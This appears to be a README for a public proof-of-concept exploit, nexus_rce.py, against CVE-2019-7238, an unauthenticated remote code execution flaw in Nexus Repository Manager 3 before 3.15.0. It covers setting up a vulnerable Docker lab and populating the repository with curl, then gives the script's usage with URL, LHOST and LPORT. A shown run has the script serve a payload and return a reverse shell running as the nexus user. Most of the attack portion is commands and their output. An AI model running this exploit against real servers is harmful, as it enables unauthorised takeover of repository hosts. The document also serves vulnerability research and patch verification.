# Nexus Repository Manager 3 Remote Code Execution without authentication < 3.15.0 (CVE-2019-7238)

## Summary

We can abuse and incorrect access control and get code execution. 

## Usage

Start docker container with if you want to test this locally

```sh
⬢  CVE-2019-7238_nexus_rce  master ⦿ docker-compose up -d 
Creating network "cve20197238nexusrce_default" with the default driver
Creating cve20197238nexusrce_nexus_server_1 ... done

⬢  CVE-2019-7238_nexus_rce  master ⦿ docker ps 
CONTAINER ID        IMAGE                    COMMAND                  CREATED             STATUS              PORTS                    NAMES
0cbb8d4caedb        sonatype/nexus3:3.14.0   "sh -c ${SONATYPE_DI…"   5 seconds ago       Up 4 seconds        0.0.0.0:8081->8081/tcp   cve20197238nexusrce_nexus_server_1
```

As this exploit is dependant that nexus repository is not empty run the prepare.sh script to populate it with some garbage data.

```sh
⬢  CVE-2019-7238_nexus_rce  master ⦿ ./prepare.sh 
*   Trying 127.0.0.1:8081...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8081 (#0)
* Server auth using Basic with user 'admin'
> PUT /repository/maven-releases/org/foo/1.0/foo-1.0.po HTTP/1.1
> Host: localhost:8081
> Authorization: Basic YWRtaW46YWRtaW4xMjM=
> User-Agent: curl/7.67.0
> Accept: */*
> Content-Length: 0
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 201 Created
< Date: Tue, 07 Jan 2020 13:11:46 GMT
< Server: Nexus/3.14.0-04 (OSS)
< X-Content-Type-Options: nosniff
< Content-Security-Policy: sandbox allow-forms allow-modals allow-popups allow-presentation allow-scripts allow-top-navigation
< Content-Length: 0
< 
* Connection #0 to host localhost left intact
```

Now you can run the exploit

```sh
⬢  CVE-2019-7238_nexus_rce  master ⦿ ./nexus_rce.py 

███▄▄▄▄      ▄████████ ▀████    ▐████▀ ███    █▄     ▄████████    ▄████████  ▄████████    ▄████████ 
███▀▀▀██▄   ███    ███   ███▌   ████▀  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
███   ███   ███    █▀     ███  ▐███    ███    ███   ███    █▀    ███    ███ ███    █▀    ███    █▀  
███   ███  ▄███▄▄▄        ▀███▄███▀    ███    ███   ███         ▄███▄▄▄▄██▀ ███         ▄███▄▄▄     
███   ███ ▀▀███▀▀▀        ████▀██▄     ███    ███ ▀███████████ ▀▀███▀▀▀▀▀   ███        ▀▀███▀▀▀     
███   ███   ███    █▄    ▐███  ▀███    ███    ███          ███ ▀███████████ ███    █▄    ███    █▄  
███   ███   ███    ███  ▄███     ███▄  ███    ███    ▄█    ███   ███    ███ ███    ███   ███    ███ 
 ▀█   █▀    ██████████ ████       ███▄ ████████▀   ▄████████▀    ███    ███ ████████▀    ██████████ 
[nighter@nighter.se]
    
Usage: ./nexus_rce.py <URL> <LHOST> <LPORT>
EXAMPLE: ./nexus_rce.py 'http://127.0.0.1:8081' 10.10.14.24 4444
```

And a shell is provided.

```sh
⬢  CVE-2019-7238_nexus_rce  master ⦿ ./nexus_rce.py 'http://127.0.0.1:8081' 10.100.68.127 4444 
[+] LHOST = 10.100.68.127
[+] Encoding
[+] Shell listen
[+] HTTP Listen = 9000
[+] Exploit
172.19.0.2 - - [07/Jan/2020 14:08:36] "GET /2 HTTP/1.1" 200 -
172.19.0.2 - - [07/Jan/2020 14:08:36] "GET /2 HTTP/1.1" 200 -
172.19.0.2 - - [07/Jan/2020 14:08:36] "GET /2 HTTP/1.1" 200 -
bash-4.2$ 172.19.0.2 - - [07/Jan/2020 14:08:36] "GET /2 HTTP/1.1" 200 -

bash-4.2$ id
uid=200(nexus) gid=200(nexus) groups=200(nexus)
```
